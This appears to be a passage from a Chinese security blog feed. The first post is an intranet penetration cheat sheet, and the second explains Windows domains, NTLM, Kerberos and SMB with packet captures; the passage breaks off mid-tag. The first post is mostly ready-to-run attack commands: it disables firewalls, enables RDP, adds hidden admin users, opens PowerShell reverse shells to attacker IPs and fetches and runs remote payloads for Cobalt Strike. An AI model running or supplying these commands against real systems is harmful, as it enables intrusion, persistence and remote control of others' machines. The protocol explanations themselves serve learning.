    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学</p><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><p>ipconfig /all</p><h3 id="查询本机的服务信息"><a href="#查询本机的服务信息" class="headerlink" title="查询本机的服务信息"></a>查询本机的服务信息</h3><p>wmic service list brief</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010533168.png" alt="image-20210217010533168"></p><h3 id="查询系统信息"><a href="#查询系统信息" class="headerlink" title="查询系统信息"></a>查询系统信息</h3><p>systeminfo</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010547050.png" alt="image-20210217010547050"></p><h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><p>tasklist / wmic process list brief</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010556587.png" alt="image-20210217010556587"></p><h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><p>schtasks /query /fo LIST /v 列出计划任务详细信息</p><h3 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h3><p>net statistics workstation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010605609.png" alt="image-20210217010605609"></p><h3 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h3><p>net user 查看所有用户<br>net localgroup administrators 获取本地管理员信息</p><h3 id="查看端口列表"><a href="#查看端口列表" class="headerlink" title="查看端口列表"></a>查看端口列表</h3><p>netstat -ano</p><h3 id="查看已打补丁"><a href="#查看已打补丁" class="headerlink" title="查看已打补丁"></a>查看已打补丁</h3><p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p><h3 id="查看共享列表"><a href="#查看共享列表" class="headerlink" title="查看共享列表"></a>查看共享列表</h3><p>net share 查看本机共享列表和可访问的域共享列表<br>wmic share get name,path,status 查找共享列表</p><p><img src="http://www.const27.com/wp-content/uploads/2020/08/image-7.png" alt="img"></p><h3 id="路由表和arp高速缓存表"><a href="#路由表和arp高速缓存表" class="headerlink" title="路由表和arp高速缓存表"></a>路由表和arp高速缓存表</h3><p>route print 路由表<br>arp -a arp高速缓存表</p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>netsh firewall set opmode disable 关闭防火墙(Windows Server 2003 以前的版本)</p><p>netsh advfirewall set allprofiles state off 关闭防火墙(Windows Server 2003 以后的版本)</p><p>netsh firewall show config 查看防火墙配置<br>如果上面的命令被弃用，则使用<br>netsh advfirewall firewall show rule name=all</p><p>根据参考，可以使用这个wmic一键获取本机信息<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><h3 id="权限查看"><a href="#权限查看" class="headerlink" title="权限查看"></a>权限查看</h3><p>whoami /all 查看自己的详细权限<br>net user xxx /domain 查看域内指定用户的权限</p><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>.net time /domain 若出现以下情况则不存在域</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010613612.png" alt="image-20210217010613612"></p><p>若是报错：发生系统错误5，则存在域，但该用户不是域用户</p><p>若是以下情况则说明存在域且已经在域中</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010619330.png" alt="image-20210217010619330"></p><h3 id="查看域的名字"><a href="#查看域的名字" class="headerlink" title="查看域的名字"></a>查看域的名字</h3><p>net config workstation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010626107.png" alt="image-20210217010626107"></p><p>nslookup -type=srv _ldap._tcp</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010633461.png" alt="image-20210217010633461"></p><p>这个很爽，域控主机名和IP一块弄出来了</p><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><p>1.使用工具 nbtscan <a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><p>2.查看arp高速缓存表</p><p>arp -a</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/0X@7L2W0IVA%60NKX1AM9JZKB.png" alt="img"></p><p>3.ICMP协议探测（逐个ping）</p><p>这个贼慢，但是不用下载其他应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><p>4.nmap直接开扫</p><p>5.meterpreter会话中执行 run windows/gather/enum_ad_computers</p><h3 id="扫描域内开放端口"><a href="#扫描域内开放端口" class="headerlink" title="扫描域内开放端口"></a>扫描域内开放端口</h3><p>1.nmap</p><p>nmap 192.168.1.0/24</p><p>2.工具 S扫描器</p><p>3.自写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#python3 慢的一批</span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip,port):</span><br><span class="line">    server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        server.connect((ip,port))</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">    except Exception as err:</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip,port))</span><br><span class="line">    finally:</span><br><span class="line">        server.close()</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; &#39;172.16.0.198&#39;</span><br><span class="line">    for port in range(20,100):</span><br><span class="line">        get_ip_status(host,port)</span><br></pre></td></tr></table></figure><h3 id="域内基本信息"><a href="#域内基本信息" class="headerlink" title="域内基本信息"></a>域内基本信息</h3><p>net group “domain computers” /domain 查询所有域成员计算机列表<br>net view /domain:HACHE 查询域内所有主机<br>net accounts /domain 获取域密码信息<br>nltest /domain_trusts 获取域信任信息<br>nltest /DCLIST:hacke 查看域控制器机器名<br>Nslookup -type=SRV_ldap._tcp 查看域控制器的主机名</p><h3 id="域用户信息收集"><a href="#域用户信息收集" class="headerlink" title="域用户信息收集"></a>域用户信息收集</h3><p>net user /domain 向域控制器查询域内用户列表<br>wmic useraccount get /all 获取域内用户详细信息<br>net localgroup administrators 查询本地管理员用户<br>net group “domain admins” /domain 查询域管理员用户<br>net group “Enterprise admins” /domain 查询管理员用户组</p><h3 id="本机wmic查杀软"><a href="#本机wmic查杀软" class="headerlink" title="本机wmic查杀软"></a>本机wmic查杀软</h3><p><code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code><br>or</p><p>WMIC /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</p><h3 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h3><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><h3 id="用户增删改查"><a href="#用户增删改查" class="headerlink" title="用户增删改查"></a>用户增删改查</h3><p>net user username password /add 加用户</p><p>net localgroup administrators username /add 添加XX到管理员账户</p><h3 id="一些喜欢用的"><a href="#一些喜欢用的" class="headerlink" title="一些喜欢用的"></a>一些喜欢用的</h3><p>Windows 反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.1.4 -p 9999 -e cmd</span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666</span><br></pre></td></tr></table></figure><p>wmic 查杀软</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WMIC &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br><span class="line"></span><br><span class="line">WMIC &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List</span><br></pre></td></tr></table></figure><p>开3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 0</span><br></pre></td></tr></table></figure><p>常见杀软进程名<br><a href="https://blog.csdn.net/weixin_39997829/article/details/92666552">https://blog.csdn.net/weixin_39997829/article/details/92666552</a></p><p>cmd下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.xx.com&#x2F;code.jpg c:\users\sdyp\desktop\ff.jpg</span><br></pre></td></tr></table></figure><p>获取盘符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logicaldisk where drivetype&#x3D;3 get deviceid</span><br></pre></td></tr></table></figure><h3 id="ps-cs-上线"><a href="#ps-cs-上线" class="headerlink" title="ps cs 上线"></a>ps cs 上线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;a.ps1&#39;))</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1   (smb)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;前几天面试的时候被师傅</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网基础概览</title>
    <link href="http://yoursite.com/2021/02/19/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/"/>
    <id>http://yoursite.com/2021/02/19/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/</id>
    <published>2021-02-19T09:21:53.670Z</published>
    <updated>2021-02-19T08:51:00.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="域，工作组，活动目录"><a href="#域，工作组，活动目录" class="headerlink" title="域，工作组，活动目录"></a>域，工作组，活动目录</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>工作组可以认为是同一网络内，功能相似的电脑进行的分组。<br>举个例子：<br>“在一个网络内，可能有成百上千台电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。为了解决这一问题，Windows 9x/NT/2000就引用了“工作组”这个概念，将不同的电脑一般按功能分别列入不同的组中，如财务部的电脑都列入“财务部”工作组中，人事部的电脑都列入“人事部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。 ”<br>这就是工作组，但是在工作组中的电脑还是各自管理。当其中一台计算机访问另一台计算机时还是要经过另一台计算机的认证的</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域，是一群相互信任的计算机的集合<br>想要访问域中资源就必须经过一台负责每一台联入网络的电脑和用户的验证工作的服务器，这个服务器叫做 域控制器 （Domain Controller，简写为DC） 的安全认证。每个域至少要有一个域控制器。<br>当某计算机连入域时，DC就会鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息不正确，域控制器就拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源 。<br>另外，当一个域和另一个域建立信任关系后，两个域就可以按需要相互管理</p><h2 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h2><p>“ 工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。 ”</p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>活动目录 (Active Directory,AD) ,用于存储有关网络对象的信息。帮助用户快速准确的找到所需的信息服务,“ 如果把企业的内网看成一本字典，那么<strong>内网里的资源就是字典里的内容，活动目录就相当于字典的索引</strong> ”</p><p>活动目录的功能：</p><ul><li>账号集中管理</li><li>软件集中管理</li><li>环境集中管理</li><li>增强安全性</li><li>更可靠，更短的宕机时间</li></ul><p>“要实现域环境，实际上就是安装AD，<strong>如果内网中的一台计算机上安装了AD，它就变成了DC(用于存储活动目录数据库的计算机)。</strong>”</p><h1 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h1><p>NTLM也是一个认证协议，与Kerberos协议功能是一样的，不过NTLM的安全性可没有Kerberos好</p><h2 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h2><p>NTLM协议验证机制是基于 挑战(chanllage)/回应(response) 模式的</p><p>它的验证模式大致如下:</p><ol><li>用户输入账号密码，本地把密码加密为一个hash值，称为<strong>NTML-Hash</strong></li><li>客户端向服务器发送用户名 （这个数据称为 <strong>TYPE 1 Negotiate</strong> ）</li><li>服务端接收请求，判断数据库中该用户名是否存在，若存在则生成一个16位随机数称之为chanllage。同时将chanllage返回给客户端 （ <strong>TYPE 2</strong> ）</li><li>客户端收到chanllage后将其用上面生成的hash值来加密这个chanllange，并与用户名，chanllange等组合到一起得到<strong>Net-NTLMHash</strong> 最后将 Net-NTLMHash 封装到 <strong>TYPE 3 NTLM_AUTH</strong>消息中发往服务器。</li><li>服务器收到TYPE3后，用自己数据库中该用户的密码的NTML-Hash加密chanllage，并比较自己计算出的 <strong>Net-NTLMHash</strong> 与客户端发过来的 <strong>Net-NTLMHash</strong> ，若相同则认证成功</li><li>（以上是客户端-服务端模型，若是在域中，验证步骤就会有点不同）<br>若在域中，那么服务端在第5步收到TYPE3后不会自行进行比对，而是将 Net NTLM-Hash 转发给域控制器DC，由DC进行最后的 Net NTLM-Hash 比较认证</li></ol><h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos协议，是一个常用的认证与授权协议(下面只是简化过的大致流程，具体流程请看下面的wireshark抓包分析)</p><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217011242.png" alt="QQ图片20210217011242"></p><h2 id="参与的关键角色"><a href="#参与的关键角色" class="headerlink" title="参与的关键角色"></a>参与的关键角色</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217011359.png" alt="QQ图片20210217011359"></p><ul><li><strong>Client</strong>: Application Client 应用客户端</li><li><strong>AS</strong>: Authentication Server 用来认证用户身份</li><li><strong>TGS</strong>: Ticket-Granting Service 用来授权服务访问</li><li><strong>SS</strong>: Service Server 用户所请求的服务</li><li>其中AS和TGS都属于KDC系统（ 密钥分发中心 ）</li></ul><h2 id="认证："><a href="#认证：" class="headerlink" title="认证："></a>认证：</h2><p>以下的加密都是对称加密</p><h3 id="1-用户登录"><a href="#1-用户登录" class="headerlink" title="1.用户登录"></a>1.用户登录</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217125043.png" alt="QQ图片20210217125043"></p><p>用户先输入用户名和密码，其中密码在这个阶段会被单向hash函数加密为一个密钥，用来解密后面的信息</p><h3 id="2-请求身份认证（client和kdc双向认证）"><a href="#2-请求身份认证（client和kdc双向认证）" class="headerlink" title="2.请求身份认证（client和kdc双向认证）"></a>2.请求身份认证（client和kdc双向认证）</h3><h4 id="2-1-客户端向AS发送认证请求"><a href="#2-1-客户端向AS发送认证请求" class="headerlink" title="2.1 客户端向AS发送认证请求"></a>2.1 客户端向AS发送认证请求</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125323.png" alt="QQ截图20210217125323"></p><p>客户端向as发送用户名信息（明文）（进发送用户名而没有发送密码）</p><h4 id="2-2AS确认客户端身份"><a href="#2-2AS确认客户端身份" class="headerlink" title="2.2AS确认客户端身份"></a>2.2AS确认客户端身份</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125335.png" alt="QQ截图20210217125335"></p><p>AS先把用户名在数据库中查找一下，如果该用户名存在则找到该用户的密码使用单向hash函数生成client密钥并返回Msg A和B。<br>A中的内容是一个被Client密钥加密的用于生成Authenticator1的数据<br>B中的内容是一个被TGS密钥加密的一堆信息叫做<strong>TGT</strong>，当前无TGS密钥故无法解开，其中包含 客户端ID，有效期 ，Client网络地址以及MSG A解密后的内容</p><h3 id="3-请求服务授权（client请求kdc认证server）"><a href="#3-请求服务授权（client请求kdc认证server）" class="headerlink" title="3. 请求服务授权（client请求kdc认证server）"></a>3. 请求服务授权（client请求kdc认证server）</h3><h4 id="3-1-客户端向TGS发送请求服务授权请求"><a href="#3-1-客户端向TGS发送请求服务授权请求" class="headerlink" title="3.1 客户端向TGS发送请求服务授权请求"></a>3.1 客户端向TGS发送请求服务授权请求</h4><p><img src="http://www.nosqlnotes.com/wp-content/uploads/2017/12/3.1%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E8%AE%BF%E9%97%AE.png" alt="3.1客户端请求授权服务访问"></p><p>Client在MSG C向TGS发送 请求的服务的ID，2.2中的TGT，MSG D 发送由 **[Client/TGS SessionKey]**加密的Authenticator 1 {Client ID, Timestamp}。</p><h4 id="3-2-TGS为Client响应服务授权票据"><a href="#3-2-TGS为Client响应服务授权票据" class="headerlink" title="3.2 TGS为Client响应服务授权票据"></a>3.2 TGS为Client响应服务授权票据</h4><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125347.png" alt="QQ截图20210217125347" style="zoom:150%;" /><ul><li><p>Msg E</p><p>  使用</p><p>[Service密钥]</p><p>加密的Client-To-Server Ticket, 该Ticket中包含了如下信息:</p><ul><li><strong>[Client/Server SessionKey]</strong></li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></li><li><p><strong>Msg F</strong>  使用**[Client/TGS SessionKey]<strong>加密的</strong>[Client/Server SessionKey]**。</p></li></ul><h3 id="4-发送服务请求（client与ss双向认证）"><a href="#4-发送服务请求（client与ss双向认证）" class="headerlink" title="4. 发送服务请求（client与ss双向认证）"></a>4. 发送服务请求（client与ss双向认证）</h3><h5 id="4-1-Client向SS-Service-Server-发送服务请求"><a href="#4-1-Client向SS-Service-Server-发送服务请求" class="headerlink" title="4.1 Client向SS(Service Server)发送服务请求"></a>4.1 Client向SS(Service Server)发送服务请求</h5><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125356.png" alt="QQ截图20210217125356" style="zoom:150%;" /><p>发送的消息中包括：</p><ul><li><strong>Msg E</strong>  上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client为SS携带的消息。</li><li><strong>Msg G</strong>  由**[Client/Server SessionKey]<strong>加密的</strong>Authenticator 2**，包含{Client ID, Timestamp}信息。<br>这里的Authenticator 2区别于前面3.1步骤中的Authenticator 1。</li></ul><p><strong>Note</strong></p><ol><li><strong>[Client/Server SessionKey]**并未直接透明传输，而是被包含在使用</strong>[Service密钥]**加密的Msg E中。</li><li>既然**[Client/Server SessionKey]<strong>并不直接透明传输， Client需要向SS证明自己拥有正确的</strong>[Client/Server SessionKey]<strong>，所以，Authenticator 2使用了</strong>[Client/Server SessionKey]**加密。</li></ol><h4 id="4-2-SS响应Client"><a href="#4-2-SS响应Client" class="headerlink" title="4.2 SS响应Client"></a>4.2 SS响应Client</h4><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125405.png" alt="QQ截图20210217125405" style="zoom:150%;" /><h2 id="Kerberos抓包分析"><a href="#Kerberos抓包分析" class="headerlink" title="Kerberos抓包分析"></a>Kerberos抓包分析</h2><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125405.png" alt="QQ截图20210217125405" style="zoom:150%;" /><p>以上是kerberos协议简化图</p><h3 id="ASREQ"><a href="#ASREQ" class="headerlink" title="ASREQ"></a>ASREQ</h3><p>即客户端往服务端的第一次通讯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125644.png" alt="QQ截图20210217125644"></p><p>我抓到的包的样子,我们来解读一下<br>1.pvno: 标记着kerberos协议的版本<br>2.msg-type: 标记着这个包的类型， ASREQ对应的就是KRBAS_REQ(0x0a)<br>3.padata:用于存储一些认证信息<br>其实这个头下面还有很多不同的类型的头，但是这里抓到了PA-DATA PA-ENC-TIMESTAMP和PA-DATA PA-PAC-REQUEST这两个头部，但是这两个头部是padata最常用最核心的头部.<br>PA-DATA PA-ENC-TIMESTAMP : 就是用户hash加密的时间戳,作用在于:as配合用户的明文账户(cname头)在数据库中查询该用户是否存在，若存在则取用其hash来解密这个时间戳，若揭秘成功则认证通过<br>PA-DATA PA-ENC-TIMESTAMP:  这个是启用PAC(一个控制用户权限的东西)支持的扩展。<br>4.req-body:请求主体，也包含了许多信息.这个头里面比较重要的东西是<br>cname:存储着发送请求的用户名（明文用户名）<br>sname:这个包含的是服务端的身份, 在ASREQ里面是krbtgt ，还有所在域名称。till为到期时间，nonce为随机生成数<br>realm:所在域名称<br>etype:告知服务器，这个hash的加密方式</p><p>之前一直困扰我的 “为什么有些文章说的第一步是向服务器发送明文账户名，有些文章是向服务器发送时间戳hash”问题抓了一下包就懂了..</p><h3 id="ASREP"><a href="#ASREP" class="headerlink" title="ASREP"></a>ASREP</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125844.png" alt="QQ截图20210217125844"></p><p>1.ticket:这个就是TGT了。<br>tkt-vno:票据格式版本号<br>realm:所在域名<br>sname:同asres<br>enc-part:被krbtgt密钥加密的票据本体部分<br>2.enc-part:被client hash 加密的login session key</p><h3 id="TGSREQ"><a href="#TGSREQ" class="headerlink" title="TGSREQ"></a>TGSREQ</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130159.png" alt="QQ截图20210217130159"></p><p>1.ap-req-&gt;…-&gt;tikect: 可以发现TGSREQ把整个TGT发送给了TGS<br>2ap-req-&gt;…-&gt;authenticator:被login session key加密的时间戳和client id</p><h3 id="TGSREP"><a href="#TGSREP" class="headerlink" title="TGSREP"></a>TGSREP</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125903.png" alt="QQ截图20210217125903"></p><p>1.tikect:这里就是TGS部分了。<br>enc-part：这里的enc-part是被所请求的服务的用户hash加密的<br>2.enc-part:被login session key加密的service session key</p><h1 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h1><p>SMB协议是一个用于两台计算机间共享文件 、打印机、串口等功能的协议。<br>网上邻居功能就是依靠SMB协议而起的。<br>通过smb协议，一台计算机可以在经过smb认证后读写另一台计算机上的一些文件。<br>smb协议一般架设在NetBios协议之上。<br>NetBIOS 使用下列端口：UDP/137（NetBIOS 名称服务）、UDP/138（NetBIOS 数据报服务）、TCP/139（NetBIOS 会话服务）；SMB 使用下列端口：TCP/139、TCP/445。</p><h2 id="SMB认证"><a href="#SMB认证" class="headerlink" title="SMB认证"></a>SMB认证</h2><p>如果我们想依靠smb协议去读写另一台计算机上的文件，那么其中的SMB认证情况是如何呢？我们简单分析一下。</p><p>1.版本确立阶段<br>2.用户认证阶段<br>3.资源链接阶段<br>4.资源读写阶段</p><p>更详细一点。<br>1.版本确立阶段。客户端先发送自己支持的SMB协议版本给服务器，服务器收到后向客户端列出希望使用的版本。若客户端支持的smb版本服务器均不支持，则返回 0XFFFFH，结束通信 。<br>2.用户认证阶段。确立好认证版本后，就是客户端发送账户密码给服务端进行身份验证了。服务器收到后返回认证成功或失败<br>3.资源链接阶段。用户认证通过后，客户端发送自己想要访问的资源名，服务器收到后返回允许或拒绝<br>4.资源读写阶段，客户端开始读写服务器上文件。</p><p>看起来比ntlm和kerberos简单多了。抓包分析一下。</p><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>1.1 客户端向服务端列出当前支持的smb版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130121.png" alt="QQ截图20210217130121"></p><p>1.2服务器返回希望的SMB版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130226.png" alt="QQ截图20210217130226"></p><p>1.3这里说个题外话，此时服务器只是选中了SMB2，但是SMB2也分了很多版本，所以客户端还会基于SMB2继续进行版本问询</p><img src="http://www.const27.com/wp-content/uploads/2020/11/image-10.png" alt="img" style="zoom:150%;" /><p>然后服务器再继续选择一个细分版本，版本协商结束</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130238.png" alt="QQ截图20210217130238"></p><p>2.1 客户端向服务端提供用户信息。SMB协议的这一个部分使用NTLM协议完成的。建议先看看NTLM认证再过来<br>首先客户端发送一个请求NTLM认证的包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130252.png" alt="QQ截图20210217130252"></p><p>2.2服务端返回challenge</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130331.png" alt="QQ截图20210217130331"></p><p>2.3 客户端发送用户名，被client hash加密的challenge（NTLM RESPONSE）给服务端</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130400.png" alt="QQ截图20210217130400"></p><p>2.4服务端进行认证处理，返回认证成功或失败，下图是成功时，返回 会话建立字样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130419.png" alt="QQ截图20210217130419"></p><p>3.1客户端发送请求的资源</p><p><img 